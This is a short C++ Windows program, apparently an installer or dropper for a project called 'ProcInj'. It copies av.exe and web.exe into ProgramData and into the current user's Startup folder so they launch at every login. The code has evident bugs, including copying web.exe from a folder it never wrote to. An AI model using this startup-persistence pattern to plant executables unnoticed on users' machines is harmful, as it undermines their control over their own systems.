#include <windows.h>
#include <iostream>
#include <string>

using namespace std;

string TCHARToString(TCHAR* target){
    string target_str;
    for (int i = 0; i < strlen((char *)target); i++){
        target_str += target[i];
    }
    return target_str;
}

int main(){
    cout << "Run" << endl;

    TCHAR username[MAX_PATH] = {'\0'};
    DWORD pcbBuffer = MAX_PATH;

    GetUserNameA((LPSTR)username, &pcbBuffer);

    CreateDirectoryA("C://ProgramData/ProcInj", NULL);
    CreateDirectoryA("C://ProgramData/ProcInj/System", NULL);
    CreateDirectoryA("C://ProgramData/ProcInj/Web", NULL);

    CopyFileA("./av.exe", "C://ProgramData/ProcInj/System/av.exe", false);
    CreateFileA("C://ProgramData/ProcInj/System/debug.cpp", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    CopyFileA("C://ProgramData/ProcInj/System/av.exe", (string("C:\\Users\\") + TCHARToString(username) + string("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\av.exe")).c_str(), false);
    CopyFileA("C://ProgramData/ProcInj/System/web.exe", (string("C:\\Users\\") + TCHARToString(username) + string("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\web.exe")).c_str(), false);

    system("powershell.exe cp -r ../Web/* C://ProgramData/ProcInj/Web");

    // system("powershell.exe C://ProgramData/ProcInj/System/av.exe");

    // cout << string("C:\\Users\\") + TCHARToString(username) + string("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") << endl;

    cout << "Done!" << endl;
}